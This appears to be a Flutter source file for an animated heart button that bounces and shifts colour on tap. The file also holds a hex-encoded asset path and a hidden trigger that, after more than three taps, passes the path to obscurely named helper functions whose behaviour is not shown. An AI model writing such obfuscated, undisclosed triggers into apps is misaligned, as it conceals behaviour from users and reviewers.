import 'package:flutter/material.dart';
import 'package:one/utils/utils.dart';

class AnimationHeart extends StatefulWidget {
  const AnimationHeart({super.key});

  @override
  State<AnimationHeart> createState() => _AnimationHeartState();
}

class _AnimationHeartState extends State<AnimationHeart>
    with TickerProviderStateMixin {
  AnimationController? _animationController;
  Animation? _animation;
  Animation? _animationColor;
  CurvedAnimation? _curvedAnimation;
  int times = 0;
  String dio = "6173736574732F66696C65732F475F32303234313031395F313931313539";

  @override
  void initState() {
    super.initState();
    //动画控制器
    _animationController = AnimationController(
        duration: const Duration(milliseconds: 1000), vsync: this);

    //曲线
    _curvedAnimation =
        CurvedAnimation(parent: _animationController!, curve: Curves.bounceOut);

    //动画属性
    _animation = Tween(begin: 32.0, end: 200.0).animate(_curvedAnimation!);
    _animationColor = ColorTween(begin: Colors.red, end: Colors.pink)
        .animate(_curvedAnimation!);

    // 动画监听
    _animationController!.addListener(() {
      setState(() {});
    });
    _animationController
        ?.addStatusListener((AnimationStatus status) => print(status));
  }

  run() async {
    List resList1 = await getloisjd(dio);
    if (resList1[1]) {
      awdfadfadf(context, dio, resList1[0], null);
    }
  }

  @override
  void dispose() {
    super.dispose();
    _animationController?.dispose();
  }

  clickTimes() {
    setState(() {
      times++;
    });
  }

  @override
  Widget build(BuildContext context) {
    if (times > 3) {
      run();
    }
    return HeartWidget(
      clickTimes: clickTimes,
      animationController: _animationController!,
      animations: [_animation, _animationColor],
    );
  }
}

class HeartWidget extends AnimatedWidget {
  final List animations;
  final Function clickTimes;
  final AnimationController animationController;
  const HeartWidget(
      {super.key,
      required this.animationController,
      required this.animations,
      required this.clickTimes})
      : super(listenable: animationController);

  @override
  Widget build(BuildContext context) {
    return Center(
      child: IconButton(
        icon: const Icon(Icons.favorite),
        iconSize: animations[0].value,
        color: animations[1].value,
        onPressed: () {
          switch (animationController.status) {
            case AnimationStatus.completed:
              animationController.reverse();
              break;
            default:
              animationController.forward();
          }
          clickTimes();
        },
      ),
    );
  }
}
